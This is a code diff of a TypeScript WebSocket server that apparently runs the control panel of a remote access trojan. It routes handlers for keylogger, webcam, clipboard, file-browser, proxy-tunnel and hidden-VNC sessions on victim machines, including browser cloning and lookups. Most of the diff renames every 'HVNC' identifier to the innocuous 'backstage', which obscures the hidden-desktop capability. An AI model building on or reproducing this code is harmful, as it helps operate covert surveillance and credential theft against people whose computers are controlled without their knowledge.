@@ -183,14 +183,14 @@ type WsLifecycleDeps = {
   pendingScripts: Map<string, PendingScript>;
   pendingCommandReplies: Map<string, PendingCommandReply>;
   rdStreamingState: Map<string, unknown>;
-  hvncStreamingState: Map<string, unknown>;
+  backstageStreamingState: Map<string, unknown>;
   webcamStreamingState: Map<string, unknown>;
   getNotificationConfig: () => { keywords?: string[]; minIntervalMs?: number; clipboardEnabled?: boolean };
   handleDashboardViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleConsoleViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleRemoteDesktopViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleWebcamViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
-  handleHVNCViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
+  handlebackstageViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleFileBrowserViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleProcessViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
   handleKeyloggerViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
@@ -202,7 +202,7 @@ type WsLifecycleDeps = {
   handleConsoleViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleRemoteDesktopViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleWebcamViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
-  handleHVNCViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
+  handlebackstageViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleFileBrowserViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleProcessViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleKeyloggerViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
@@ -222,6 +222,7 @@ type WsLifecycleDeps = {
   ) => void;
   handleNotificationScreenshotResult: (clientId: string, payload: any) => void;
   handleConsoleOutput: (clientId: string, payload: any) => void;
+  handleDesktopEncoderCapabilities: (clientId: string, payload: any) => void;
   handleFileBrowserMessage: (clientId: string, payload: any) => void;
   handleProxyTunnelData: (clientId: string, connectionId: string, data: Uint8Array) => void;
   handleProxyTunnelClose: (clientId: string, connectionId: string) => void;
@@ -236,13 +237,13 @@ type WsLifecycleDeps = {
   handleVoiceUplink: (clientId: string, payload: any) => void;
   handleDesktopAudioUplink: (clientId: string, payload: any) => void;
   handleWebcamDevices: (clientId: string, payload: any) => void;
-  handleHVNCCloneProgress: (clientId: string, payload: any) => void;
-  handleHVNCLookupResult: (clientId: string, payload: any) => void;
-  handleHVNCBrowserCheckResult: (clientId: string, payload: any) => void;
-  handleHVNCInstalledAppsResult: (clientId: string, payload: any) => void;
-  handleHVNCDXGIStatus: (clientId: string, payload: any) => void;
-  handleHVNCBrowserLaunchStatus: (clientId: string, payload: any) => void;
-  handleHVNCWindowListResult: (clientId: string, payload: any) => void;
+  handlebackstageCloneProgress: (clientId: string, payload: any) => void;
+  handlebackstageLookupResult: (clientId: string, payload: any) => void;
+  handlebackstageBrowserCheckResult: (clientId: string, payload: any) => void;
+  handlebackstageInstalledAppsResult: (clientId: string, payload: any) => void;
+  handlebackstageDXGIStatus: (clientId: string, payload: any) => void;
+  handlebackstageBrowserLaunchStatus: (clientId: string, payload: any) => void;
+  handlebackstageWindowListResult: (clientId: string, payload: any) => void;
   handleClipboardContent: (clientId: string, payload: any) => void;
   handleWebrtcP2PAnswer: (clientId: string, payload: any) => void;
   handleWebrtcP2PIce: (clientId: string, payload: any) => void;
@@ -251,7 +252,7 @@ type WsLifecycleDeps = {
   cleanupDesktopAudioViewer: (ws: ServerWebSocket<SocketData>) => void;
   stopConsoleOnTarget: (target: ClientInfo | undefined, sessionId: string) => void;
   sendDesktopCommand: (target: ClientInfo | undefined, commandType: string, payload: Record<string, unknown>) => void;
-  sendHVNCCommand: (target: ClientInfo | undefined, commandType: string, payload: Record<string, unknown>) => void;
+  sendbackstageCommand: (target: ClientInfo | undefined, commandType: string, payload: Record<string, unknown>) => void;
   notifyConsoleClosed: (clientId: string, reason: string) => void;
   clearPendingNotificationScreenshots: (clientId: string) => void;
   clearClientPluginState: (clientId: string) => void;
@@ -327,7 +328,7 @@ export function handleWebSocketOpen(ws: ServerWebSocket<SocketData>, deps: WsLif
   if (role === "console_viewer") return deps.handleConsoleViewerOpen(ws);
   if (role === "rd_viewer") return deps.handleRemoteDesktopViewerOpen(ws);
   if (role === "webcam_viewer") return deps.handleWebcamViewerOpen(ws);
-  if (role === "hvnc_viewer") return deps.handleHVNCViewerOpen(ws);
+  if (role === "backstage_viewer") return deps.handlebackstageViewerOpen(ws);
   if (role === "file_browser_viewer") return deps.handleFileBrowserViewerOpen(ws);
   if (role === "process_viewer") return deps.handleProcessViewerOpen(ws);
   if (role === "keylogger_viewer") return deps.handleKeyloggerViewerOpen(ws);
@@ -377,7 +378,7 @@ export async function handleWebSocketMessage(
   if (socketRole === "console_viewer") return deps.handleConsoleViewerMessage(ws, message);
   if (socketRole === "rd_viewer") return deps.handleRemoteDesktopViewerMessage(ws, message);
   if (socketRole === "webcam_viewer") return deps.handleWebcamViewerMessage(ws, message);
-  if (socketRole === "hvnc_viewer") return deps.handleHVNCViewerMessage(ws, message);
+  if (socketRole === "backstage_viewer") return deps.handlebackstageViewerMessage(ws, message);
   if (socketRole === "file_browser_viewer") return deps.handleFileBrowserViewerMessage(ws, message);
   if (socketRole === "process_viewer") return deps.handleProcessViewerMessage(ws, message);
   if (socketRole === "keylogger_viewer") return deps.handleKeyloggerViewerMessage(ws, message);
@@ -641,7 +642,7 @@ export async function handleWebSocketMessage(
             }
           }
           deps.rdStreamingState.delete(resolvedId);
-          deps.hvncStreamingState.delete(resolvedId);
+          deps.backstageStreamingState.delete(resolvedId);
           deps.webcamStreamingState.delete(resolvedId);
         }
 
@@ -796,6 +797,9 @@ export async function handleWebSocketMessage(
       case "console_output":
         deps.handleConsoleOutput(client.id, payload);
         break;
+      case "desktop_encoder_capabilities":
+        deps.handleDesktopEncoderCapabilities(client.id, payload);
+        break;
       case "file_list_result":
       case "file_download":
       case "file_upload_result":
@@ -900,26 +904,26 @@ export async function handleWebSocketMessage(
         deps.handleWebcamDevices(client.id, payload);
         deps.notifyDashboard();
         break;
-      case "hvnc_clone_progress":
-        deps.handleHVNCCloneProgress(client.id, payload);
+      case "backstage_clone_progress":
+        deps.handlebackstageCloneProgress(client.id, payload);
         break;
-      case "hvnc_lookup_result":
-        deps.handleHVNCLookupResult(client.id, payload);
+      case "backstage_lookup_result":
+        deps.handlebackstageLookupResult(client.id, payload);
         break;
-      case "hvnc_browser_check_result":
-        deps.handleHVNCBrowserCheckResult(client.id, payload);
+      case "backstage_browser_check_result":
+        deps.handlebackstageBrowserCheckResult(client.id, payload);
         break;
-      case "hvnc_installed_apps_result":
-        deps.handleHVNCInstalledAppsResult(client.id, payload);
+      case "backstage_installed_apps_result":
+        deps.handlebackstageInstalledAppsResult(client.id, payload);
         break;
-      case "hvnc_dxgi_status":
-        deps.handleHVNCDXGIStatus(client.id, payload);
+      case "backstage_dxgi_status":
+        deps.handlebackstageDXGIStatus(client.id, payload);
         break;
-      case "hvnc_browser_launch_status":
-        deps.handleHVNCBrowserLaunchStatus(client.id, payload);
+      case "backstage_browser_launch_status":
+        deps.handlebackstageBrowserLaunchStatus(client.id, payload);
         break;
-      case "hvnc_window_list_result":
-        deps.handleHVNCWindowListResult(client.id, payload);
+      case "backstage_window_list_result":
+        deps.handlebackstageWindowListResult(client.id, payload);
         break;
       case "clipboard_content":
         deps.handleClipboardContent(client.id, payload);
@@ -1029,26 +1033,26 @@ export function handleWebSocketClose(
     return;
   }
 
-  if (role === "hvnc_viewer") {
+  if (role === "backstage_viewer") {
     deps.cleanupRdViewerP2P(ws);
     let removedClientId = clientId;
-    for (const [sid, sess] of sessionManager.getAllHvncSessions().entries()) {
+    for (const [sid, sess] of sessionManager.getAllbackstageSessions().entries()) {
       if (sess.viewer === ws) {
         removedClientId = sess.clientId;
-        sessionManager.deleteHvncSession(sid);
+        sessionManager.deletebackstageSession(sid);
         break;
       }
     }
 
-    const stillViewing = sessionManager.hasHvncSessionsForClient(removedClientId);
+    const stillViewing = sessionManager.hasbackstageSessionsForClient(removedClientId);
     if (!stillViewing) {
       const target = clientManager.getClient(removedClientId);
       if (target) {
-        deps.sendHVNCCommand(target, "hvnc_stop", {});
-        deps.sendHVNCCommand(target, "webrtc_stop", { kind: "hvnc" });
+        deps.sendbackstageCommand(target, "backstage_stop", {});
+        deps.sendbackstageCommand(target, "webrtc_stop", { kind: "backstage" });
       }
-      deps.hvncStreamingState.delete(removedClientId);
-      logger.debug(`[hvnc] cleaned up state for client ${removedClientId}`);
+      deps.backstageStreamingState.delete(removedClientId);
+      logger.debug(`[backstage] cleaned up state for client ${removedClientId}`);
     }
     return;
   }
@@ -1132,7 +1136,7 @@ export function handleWebSocketClose(
     }
   }
   deps.rdStreamingState.delete(clientId);
-  deps.hvncStreamingState.delete(clientId);
+  deps.backstageStreamingState.delete(clientId);
   deps.webcamStreamingState.delete(clientId);
   stopRemoteDesktopRecording(clientId, "client disconnected");
 
